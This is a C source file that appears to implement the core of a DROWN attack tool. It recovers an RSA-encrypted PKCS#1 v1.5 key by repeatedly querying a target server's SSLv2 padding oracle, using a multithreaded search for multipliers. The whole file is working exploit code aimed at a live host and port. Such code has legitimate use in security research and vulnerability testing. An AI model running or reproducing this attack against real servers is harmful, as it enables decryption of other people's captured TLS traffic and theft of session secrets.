#include <openssl/bn.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <pthread.h>
#include <semaphore.h>
#include "decrypt.h"
#include "oracle.h"


void BN_dump(BIGNUM *bn)
{
    printf("%s\n", BN_bn2hex(bn));
}


void oracle_guess(drown_ctx *dctx, BIGNUM *c, BIGNUM *k, int bsize)
{
    int bytesize = bsize/8-1;
    unsigned char result[24];
    unsigned char enc_key[256] = {0};

    // Convert c to array
    BN_bn2bin(c, enc_key + 256 - BN_num_bytes(c));

    // Run the oracle
    run_oracle_guess(dctx->hostport, bytesize, enc_key, 256, result);

    // Convert m to bignum
    BN_bin2bn(result, bytesize, k);
}

/*
    Checks whether c is valid for any length of padding we know.
    Returns the numbers of bits we can learn (0 if invalid).
*/
int oracle_valid_multiple(drown_ctx *dctx, BIGNUM *c)
{
    unsigned char enc_key[256] = {0};

    // Convert c to array
    BN_bn2bin(c, enc_key + 256 - BN_num_bytes(c));

    // Run the oracle
    int size = run_oracle_valid_multiple(dctx->hostport, enc_key, 256);
    if(size == 0)
        return 0;
    else
        return (size + 1) * 8;
}

/*
    Checks whether c is correctly padded to 24 bytes.
    Returns the numbers of bits we can learn (0 if invalid).
*/
int oracle_valid(drown_ctx *dctx, BIGNUM *c)
{
    unsigned char enc_key[256] = {0};

    // Convert c to array
    BN_bn2bin(c, enc_key + 256 - BN_num_bytes(c));

    // Run the oracle
    if(run_oracle_valid(dctx->hostport, 24, enc_key, 256))
        return 25*8;
    return 0;
}


#define NUM_THREADS 5

typedef struct item_t
{
    BIGNUM *c;
    BIGNUM *mt;
    unsigned long s;
    int l;
    int finished;
} item_t;

item_t item_new(BIGNUM *c, BIGNUM *mt, unsigned long s)
{
    item_t item = {
        .c = BN_dup(c),
        .mt = BN_dup(mt),
        .s = s,
        .finished = 0
    };
    return item;
}

void item_free(item_t item)
{
    BN_free(item.c);
    BN_free(item.mt);
}

typedef struct queue_t
{
    sem_t cEmpty; // Number of empty slots
    sem_t cFull; // Number of full slots
    pthread_mutex_t mutex;
    struct item_t items[NUM_THREADS];
    int cnt;
    drown_ctx *dctx;
    struct item_t result;
    int finished;

} queue_t;

int insert_item(queue_t *queue, item_t item)
{
    pthread_mutex_lock(&queue->mutex);
    if(queue->cnt >= NUM_THREADS)
    {
        fprintf(stderr, "Insert problem !\n");
        exit(1);
    }
    queue->items[queue->cnt] = item;
    queue->cnt++;
    pthread_mutex_unlock(&queue->mutex);
    return 0;
}

int remove_item(queue_t *queue, item_t *item)
{
    pthread_mutex_lock(&queue->mutex);
    if(queue->cnt <= 0)
    {
        fprintf(stderr, "Remove problem !\n");
        exit(1);
    }
    *item = queue->items[queue->cnt - 1];
    queue->cnt--;
    pthread_mutex_unlock(&queue->mutex);
    return 0;
}

void * worker(void *data)
{
    queue_t *queue = (queue_t *)data;

    item_t item;

    while(1)
    {
        // Wait for work
        sem_wait(&queue->cFull);
        remove_item(queue, &item);

        // Time to die
        if(item.finished)
            break;

        // Do the actual work
        int l = oracle_valid(queue->dctx, item.c);

        if(l)
        {
            // If we have a result, save it
            item.l = l;
            pthread_mutex_lock(&queue->mutex);
            queue->finished = 1;
            queue->result = item;
            pthread_mutex_unlock(&queue->mutex);
        }
        else
            item_free(item);

        sem_post(&queue->cEmpty);
    };

    return NULL;
}

int check_multiplier(unsigned long s, BIGNUM *cl_1e, drown_ctx* dctx, int *l, BIGNUM *ss, BIGNUM *upperbits, queue_t *queue)
{
    BIGNUM *c = dctx->c;
    BIGNUM *n = dctx->n;
    BIGNUM *e = dctx->e;
    BIGNUM *mt = dctx->mt;
    BN_CTX *ctx = dctx->ctx;

    // Check 2 * B <= mt < 3 * B
    BN_rshift(upperbits, mt, 2032);
    if(BN_is_word(upperbits, 0x0002))
    {
        // cc = c * (s / l) ** e = ((c / l) ** e) * (c ** e)
        BN_set_word(ss, s);
        BN_mod_exp(c, ss, e, n, ctx);
        BN_mod_mul(c, cl_1e, c, n, ctx);

        // THREAD : add to queue
        item_t item = item_new(c, mt, s);
        sem_wait(&queue->cEmpty);
        insert_item(queue, item);
        sem_post(&queue->cFull);

        return 1;
    }

    return 0;
}

#define MAX_CACHE_SIZE 5

/*
    Finds a multiplier s, so that c_2 = c_1 * (s * l_1) ** e is valid.

    for each s
        mt_2 = mt_1 * s * l_1
        if 2*B <= mt_2 < 3*B
            c_2 = c_1 * (s * l_1) ** e
            if oracle(c_2)
                return s
        end
    end

    Updates c, s, mt, l, ?
*/
/*
    Threaded search ?
    We spawn X threads. 
    Each thread waits for an input to be given. It then computes.
    When all the threads are occupied, the master waits for one to complete.
*/
int find_multiplier(drown_ctx *dctx, BIGNUM *l_1, BIGNUM * ss, queue_t *queue)
{
    BIGNUM *c = dctx->c;
    BIGNUM *n = dctx->n;
    BIGNUM *e = dctx->e;
    BIGNUM *mt = dctx->mt;

    BN_CTX *ctx = dctx->ctx;
    BN_CTX_start(ctx);
    BIGNUM *inc = BN_CTX_get(ctx);
    BIGNUM *cl_1e = BN_CTX_get(ctx);
    BIGNUM *mttmp = BN_CTX_get(ctx);
    BIGNUM *upperbits = BN_CTX_get(ctx);

    // Precompute c * (l_1 ** e)
    BN_mod_exp(cl_1e, l_1, e, n, ctx);
    BN_mod_mul(cl_1e, c, cl_1e, n, ctx);

    int l = 0;

    // We will try every value of s, so we will add instead of multiplying
    // Compute our increment
    BN_mod_mul(inc, mt, l_1, n, ctx);
    unsigned long s = 1;
    BN_copy(mt, inc);

    // We will cache some values of delta_s and delta_mt
    unsigned long cache_s[MAX_CACHE_SIZE];
    BIGNUM * cache_mt[MAX_CACHE_SIZE];
    int cache_size = 0;
    unsigned long last_s;
    BIGNUM *last_mt = BN_CTX_get(ctx);

    queue->finished = 0;

    // First, we try to find a multiplier s so that 2 * B <= s * mt * l_1 < 3 * B
    while(!check_multiplier(s, cl_1e, dctx, &l, ss, upperbits, queue))
    {
        BN_mod_add(mt, mt, inc, n, ctx);
        s++;
    }

    // Loop while we don't have a result
    while(!queue->finished)
    {
        // Remember the values of s and mt to compute delta_s and delta_mt
        last_s = s;
        BN_copy(last_mt, mt);

        // We try to find a s so that 2 * B <= s * mt * l_1 < 3 * B
        do
        {
            BN_mod_add(mt, mt, inc, n, ctx);
            s++;
        } while(!check_multiplier(s, cl_1e, dctx, &l, ss, upperbits, queue));

        // If the cache is not full, add delta_s and delta_mt to the cache
        if(cache_size < MAX_CACHE_SIZE)
        {
            //printf("Cache add %ld\n", s - last_s);
            cache_s[cache_size] = s - last_s;
            cache_mt[cache_size] = BN_CTX_get(ctx);
            BN_mod_sub(cache_mt[cache_size], mt, last_mt, n, ctx);
            cache_size++;
        }

        int res = 1;
        // We use cached search until either :
        // * we find a result
        // * no cached values works
        while(res && !queue->finished)
        {
            res = 0;
            BN_copy(mttmp, mt);
            for(int i = 0; i < cache_size; i++)
            {
                BN_mod_add(mt, mttmp, cache_mt[i], n, ctx);
                res = check_multiplier(s + cache_s[i], cl_1e, dctx, &l, ss, upperbits, queue);
                if(res)
                {
                    s += cache_s[i];
                    break;
                }
            }
            if(!res)
                BN_copy(mt, mttmp);
        }
    }

    // Get the response
    pthread_mutex_lock(&queue->mutex);
    item_t result = queue->result;
    BN_set_word(ss, result.s);
    BN_copy(c, result.c);
    BN_copy(mt, result.mt);
    l = result.l;
    item_free(result);
    pthread_mutex_unlock(&queue->mutex);

    // Wait for each worker to finish
    for(int i = 0; i < NUM_THREADS; i++)
        sem_wait(&queue->cEmpty);
    for(int i = 0; i < NUM_THREADS; i++)
        sem_post(&queue->cEmpty);

    BN_CTX_end(ctx);

    return l;
}

/*
    We have c0 = m0 ** e (mod n)
            m0 = PKCS_1_v1.5_pad(k)), with |k| = ksize
    Given c0, e, n, ksize and an oracle, we try to find m0 (and succeed !)
*/
void decrypt(drown_ctx *dctx)
{
    BIGNUM *c = dctx->c;
    BIGNUM *n = dctx->n;
    BIGNUM *S = dctx->s;
    BIGNUM *mt = dctx->mt;

    BN_CTX *ctx = dctx->ctx;
    BN_CTX_start(ctx);
    BIGNUM *l_1 = BN_CTX_get(ctx);
    BIGNUM *ss = BN_CTX_get(ctx);
    BIGNUM *r = BN_CTX_get(ctx);

    // mt is our current approximation of m
    // u marks the highest known bit
    // l marks the lowest unknown bit

    // At the beginning, we have
    //         u                              l
    // m  = 0002???????????????????????????????00gggggggg
    // where g is the bits of m0 (found by the oracle)


    int l = oracle_valid_multiple(dctx, c);
    oracle_guess(dctx, c, mt, l);
    int u = 2032;
    BN_set_bit(mt, 2033);


    // THREAD : create threads and queue
    pthread_t threads[NUM_THREADS];
    queue_t queue;
    sem_init(&queue.cFull, 0, 0);
    sem_init(&queue.cEmpty, 0, NUM_THREADS);
    pthread_mutex_init(&queue.mutex, NULL);
    queue.cnt = 0;
    queue.dctx = dctx;
    for(int t = 0; t < NUM_THREADS; t++)
        pthread_create(&threads[t], NULL, worker, &queue);


    // Repeat while we don't know all the bits
    while(u > l)
    {
        // We know l low bits, so we know that for the next mt, we will know approximately l more upper bits
        u -= l;

        // Compute l_1 = 2**(-l)
        BN_lshift(l_1, BN_value_one(), l);
        BN_mod_inverse(l_1, l_1, n, ctx);

        // Find a multiplier
        l = find_multiplier(dctx, l_1, ss, &queue);

        // Remember our multiplier
        BN_mod_mul(S, S, ss, n, ctx);
        BN_mod_mul(S, S, l_1, n, ctx);

        // We learnt approximately l bits.
        // However, we're multiplying by s so we're not sure of |s| + 1 bits
        u += BN_num_bits(ss) + 1;
        // Another gotcha : we must remove 01*, because they may change by addition
        while(BN_is_bit_set(mt, u))
            u++;
        u++;
        // Be sure that u and l won't collide
        if(u < l)
            u = l;
        // Great ! We know u, so we can clear the low bits
        BN_rshift(mt, mt, u);
        BN_lshift(mt, mt, u);

        // Guess the low bits
        oracle_guess(dctx, c, r, l);
        BN_add(mt, mt, r);

        BN_print_fp(stderr, mt);
        fprintf(stderr, "\n");

    }

    // THREAD : end threads
    item_t item = {
        .finished = 1
    };
    for(int t = 0; t < NUM_THREADS; t++)
    {
        sem_wait(&queue.cEmpty);
        insert_item(&queue, item);
        sem_post(&queue.cFull);
    }
    for(int t = 0; t < NUM_THREADS; t++)
        pthread_join(threads[t], NULL);


    BN_CTX_end(ctx);
}


